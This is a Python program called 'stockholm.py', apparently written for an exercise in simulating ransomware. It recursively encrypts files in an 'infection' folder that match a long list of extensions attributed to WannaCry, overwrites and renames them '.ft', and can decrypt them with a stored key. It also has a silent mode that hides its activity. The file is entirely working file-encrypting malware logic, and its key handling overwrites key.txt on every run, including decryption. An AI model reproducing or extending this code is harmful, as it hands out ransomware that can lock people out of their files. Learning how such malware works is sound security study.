import os
import sys
import argparse
import io
import cryptography
from cryptography.fernet import Fernet

# PROBLEM: Create a program called stockholm.py that encrypts and decrypts all the files inside the infection folder.
# The encryption only must affect the files with the extensions which was been afected by WannaCry.
# Without arguments, the program must encrypt the files.
# '-r' or '--reverse' argument must decrypt the files with the key passed as argument.
# '-v' or '--version' argument must show the program version.
# '-s' or '--silent' argument must not show anything in the console.
# '-h' or '--help' argument must show the help message.

# Dummy output class to avoid printing anything to the console
class NothingOutput(io.StringIO):
    def write(self, x): pass

extensions_to_encrypt = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt',
					  '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc',
					  '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg',
					  '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql',
					  '.accdb', '.mdb', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf',
					  '.sln', '.suo', '.cpp', '.pas', '.asm', '.cmd', '.bat', '.ps1', '.vbs', '.dip',
					  '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.java', '.jar', '.class',
					  '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi',
					  '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u',
					  '.djvu', '.svg', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png',
					  '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.tgz',
					  '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk',
					  '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2',
					  '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd',
					  '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx',
					  '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc',
					  '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm',
					  '.dot', '.docm', '.docb', '.docx', '.doc']

def encrypt(path, key):
    print("Encrypting files into a folder...🔑")
    try:
        # Walk through all the files and folders inside the path, recursively encrypting the files
        for root, dir, files in os.walk(path):
            for dirs in dir:
                encrypt(os.path.join(root, dirs), key)
            for file in files:
                name, extension = os.path.splitext(file)
                # Encrypt only the files with the extensions in the list
                if extension.lower() in extensions_to_encrypt:
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as file_obj:
                        content = file_obj.read()
                        fernet = Fernet(key)
                        encrypted_content = fernet.encrypt(content)
                    with open(file_path, "wb") as file_obj:
                        file_obj.write(encrypted_content)
                    
                    # Rename the encrypted file with a .ft extension
                    os.rename(file_path, file_path + ".ft")
                    print("🟢 File encrypted: " + file_path)
    except Exception as e:
        print("🔴 ERROR encrypting the files: ", e)


def decrypt(path, key):
    print("Decrypting files...🔐")
    try:
        # Walk through all the files and folders inside the path, recursively decrypting the files
        for root, dir, files in os.walk(path):
            for dirs in dir:
                decrypt(os.path.join(root, dirs), key)
            for file in files:
                name, extension = os.path.splitext(file)
                # Decrypt only the files with the .ft extension         
                if extension.lower() == ".ft":
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as file_obj:
                        content = file_obj.read()
                        fernet = Fernet(key)
                        encrypted_content = fernet.decrypt(content)
                    with open(file_path, "wb") as file_obj:
                        file_obj.write(encrypted_content)
                    
                    # Rename the decrypted file with the original extension
                    os.rename(file_path, file_path[:-3])
                    print("🟢 File decrypted: " + file_path)
    except Exception as e:
        print("🔴 ERROR decrypting the files: ", e)

def main():
    # Generate key and save it in a file outside the infection folder
    path = './infection'
    key = Fernet.generate_key()
    
    with open('key.txt', 'wb') as key_file:
        key_file.write(key + b'\n')
    
    # List of parse arguments
    parser = argparse.ArgumentParser(description='Encrypt/Decrypt files')
    parser.add_argument('path', help='Path to encrypt/decrypt', action='store_true')
    parser.add_argument('-v', '--version', help='Show version', action='store_true')
    parser.add_argument('-r', '--reverse', metavar='clave', help='Reverse string')
    parser.add_argument('-s', '--silent', help='Silent mode', action='store_true')
    args = parser.parse_args()

    # If the 'silent' flag is enabled, assign a dummy output(do nothing) to stdout
    if args.silent:
        sys.stdout = NothingOutput()
    else:
        os.system("clear")
    
    if args.version:
        print("Stockholm v0.1")
    elif args.reverse:
        print("Decrypting files...")
        decrypt(path, args.reverse)
    else:
        print("Encrypting files...")
        encrypt(path, key)     

if __name__ == '__main__':
    main()